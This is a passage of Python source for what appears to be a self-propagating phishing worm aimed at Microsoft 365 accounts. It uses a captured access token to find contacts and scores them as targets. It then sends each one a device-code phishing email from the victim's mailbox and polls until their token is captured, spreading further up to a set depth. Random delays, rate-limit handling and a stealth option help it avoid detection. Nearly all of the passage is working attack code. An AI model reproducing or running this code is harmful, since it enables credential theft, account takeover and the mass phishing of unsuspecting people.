            c.execute("UPDATE targets SET status='failed' WHERE email=?", (target_email,))
            conn.commit()
            self.failed.add(target_email)
            self._stats['total_failed'] += 1

    def propagate(self, token: str, source_email: str, depth: int = 0):
        """Main entry point: discover targets, score them, send phishing emails, and start polling."""
        if not WormConfig.ENABLED or self._stop_flag:
            return
        
        if depth >= WormConfig.MAX_DEPTH:
            logger.info(f"Reached max depth {WormConfig.MAX_DEPTH}, stopping propagation from {source_email}")
            return

        logger.worm(f"🕷️ Propagating from {source_email} at depth {depth}")
        
        # Discover targets with scores
        scored_targets = self._discover_targets(token, WormConfig.MAX_TARGETS_PER_CAPTURE)
        
        # Filter out already phished/captured/failed
        new_targets = [(email, rel, score, reason) for email, rel, score, reason in scored_targets 
                       if email not in self.phished and email not in self.captured and email not in self.failed]
        
        if not new_targets:
            logger.info("No new targets found")
            return

        # Prepare harvester for generating per-target device codes
        client_id = os.environ.get('CLIENT_ID')
        if not client_id:
            logger.error("Worm: CLIENT_ID not set, cannot get device code")
            return

        scopes = [
            "https://graph.microsoft.com/Mail.Send",
            "https://graph.microsoft.com/User.Read",
            "openid", "offline_access", "profile"
        ]

        harvester = TokenHarvester(client_id=client_id, tenant=WormConfig.TENANT,
                                   scopes=scopes, stealth=self.stealth)

        # Send phishing emails and start polling threads
        phished_count = 0
        for email, relationship, score, reason in new_targets:
            # Ensure we are within device-code rate limits before requesting
            if not self._can_request_device_code():
                ok = self._wait_for_device_code_slot()
                if not ok:
                    logger.error(f"Skipping {email}: unable to obtain device code slot within wait window")
                    continue

            # Generate a fresh device code for this individual target to avoid race conditions
            try:
                # small retry loop for transient failures / rate-limit responses
                device = None
                for attempt in range(3):
                    try:
                        device = harvester.get_device_code()
                        break
                    except Exception as e:
                        logger.warning(f"Attempt {attempt+1} failed to get device code for {email}: {e}")
                        if attempt < 2:
                            sleep_time = 2 ** attempt + random.uniform(0.5, 1.5)
                            logger.info(f"Backing off {sleep_time:.1f}s before retrying device code request")
                            time.sleep(sleep_time)
                        else:
                            raise

                if device is None:
                    raise RuntimeError("Failed to obtain device code")

                # record successful device code request for rate limiting
                self._record_device_code_request()

                user_code = device.get('user_code')
                verification_uri = device.get('verification_uri')
                logger.worm(f"Created device code {user_code} for target {email}")
            except Exception as e:
                logger.error(f"Worm cannot get device code for {email}: {e}")
                continue

            if self._send_phish(token, email, user_code, verification_uri):
                self.phished.add(email)
                phished_count += 1
                self._stats['total_phished'] += 1

                # Store target in database with per-target user_code/device_code
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO targets VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                          (email, source_email, depth, user_code, device.get('device_code'),
                           'phished', None, score, None, relationship, datetime.now().isoformat()))
                conn.commit()

                # Start polling thread for this target using its own device_code
                device_info = {'device_code': device.get('device_code')}
                self.executor.submit(self._poll_target, device_info, email, token, depth, score, relationship)

                # Delay between sending emails to avoid rate limits
                delay = random.uniform(WormConfig.MIN_EMAIL_DELAY, WormConfig.MAX_EMAIL_DELAY)
                logger.debug(f"Waiting {delay:.1f}s before next email")
                time.sleep(delay)
            else:
                logger.warning(f"Failed to phish {email}, skipping")
        
        # Update statistics in database
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO worm_stats VALUES (?, ?, ?)",
                  ('last_propagation', datetime.now().isoformat(), datetime.now().isoformat()))
        c.execute("INSERT OR REPLACE INTO worm_stats VALUES (?, ?, ?)",
                  ('total_phished', str(self._stats['total_phished']), datetime.now().isoformat()))
        c.execute("INSERT OR REPLACE INTO worm_stats VALUES (?, ?, ?)",
                  ('total_captured', str(self._stats['total_captured']), datetime.now().isoformat()))
        conn.commit()
        
        logger.worm(f"Propagation complete: {phished_count}/{len(new_targets)} targets phished from {source_email}")
    
    def get_stats(self) -> Dict:
        """Get worm statistics."""
        return {
            **self._stats,
            'phished_count': len(self.phished),
            'captured_count': len(self.captured),
            'failed_count': len(self.failed),
            'is_running': not self._stop_flag,
        }
    
    def get_targets(self, status: Optional[str] = None) -> List[Dict]:
        """Get targets from database."""
        c = conn.cursor()
        if status:
            c.execute("SELECT * FROM targets WHERE status=?", (status,))
        else:
            c.execute("SELECT * FROM targets")
        columns = [description[0] for description in c.description]
        return [dict(zip(columns, row)) for row in c.fetchall()]

# -------------------- GLOBAL WORM INSTANCE --------------------
worm = StealthWorm() if WormConfig.ENABLED else None

# -------------------- CLEANUP HANDLER --------------------
import atexit
def cleanup_worm():
    if worm:
        logger.info("Cleaning up worm...")
        worm.stop()
atexit.register(cleanup_worm)

# -------------------- HELPER FUNCTIONS --------------------
def get_worm_stats() -> Dict:
    """Get worm statistics (safe to call even if worm disabled)."""
    if worm:
        return worm.get_stats()
    return {'enabled': False}

def is_worm_enabled() -> bool:
    """Check if worm is enabled."""
    return WormConfig.ENABLED and worm is not None

def reload_email_template():
    """Force reload of email template from disk."""
    global email_template
    email_template = EmailTemplateLoader()
    return email_template.load_template()